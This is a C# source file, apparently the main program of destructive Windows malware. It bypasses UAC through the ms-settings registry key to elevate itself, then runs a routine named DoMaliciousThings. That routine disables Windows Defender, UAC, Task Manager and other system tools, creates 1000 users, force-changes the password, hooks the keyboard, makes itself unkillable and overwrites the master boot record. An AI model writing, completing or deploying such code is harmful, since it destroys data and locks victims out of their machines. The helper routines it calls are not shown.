using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.Security.Principal;
using System.Windows.Forms;

internal static class Program
{
    [STAThread]
    public static void Main()
    {
        if (!Utils.KillNonWantedProcesses())
        {
            return;
        }

        if (!(new WindowsPrincipal(WindowsIdentity.GetCurrent())).IsInRole(WindowsBuiltInRole.Administrator))
        {
            BypassUAC.Bypass();
            string WhatToElevate = Application.ExecutablePath;
            Process.Start("CMD.exe", "/c start \"" + WhatToElevate + "\"");
            RegistryKey uac_clean = Registry.CurrentUser.OpenSubKey("Software\\Classes\\ms-settings", true);
            uac_clean.DeleteSubKeyTree("shell");
            uac_clean.Close();
            Process.GetCurrentProcess().Kill();
            return;
        }

        DoMaliciousThings();
        MalwareEffects.StartMalware();
    }

    public static void DoMaliciousThings()
    {
        System.IO.File.SetAttributes(Application.ExecutablePath, System.IO.FileAttributes.Hidden | System.IO.FileAttributes.ReadOnly);
        Utils.AntiBadProcesses();
        Utils.DisableWindowsDefender();
        Utils.DisableWinRun();
        Utils.SetNewWallpaper();
        Utils.ChangeAllIcons();
        Utils.RefreshDesktop();
        Utils.DisableControlAltDel();
        Utils.DisableUserAccountControl();
        Utils.CreateRandomWindowsUsers(1000);
        Utils.ForcefullyChangePassword(Utils.GenerateRandomWindowsPassword());
        Utils.MakeProcessUnkillable();
        Utils.DisableSystemFunction("DisableTaskMgr");
        Utils.DisableSystemFunction("DisableRegistryTools");
        Utils.DisableSystemFunction("NoControlPanel");
        Utils.EnableSystemFunction("DisableCMD");
        Utils.DisableWindowsKey();
        KeyboardHook.HookToKeyboard();
        Utils.SwapMouseButtons();
        Utils.OverwriteMBR();
        Utils.HideStartMenu();
        Utils.HideElementsFromStartMenu();
        Utils.HideHiddenFiles();
        Utils.DisablePowerFunctions();
        Utils.RestartExplorer();
        Utils.HideStartMenu();
        Utils.ClearProductKeyFromRegistry();
    }
}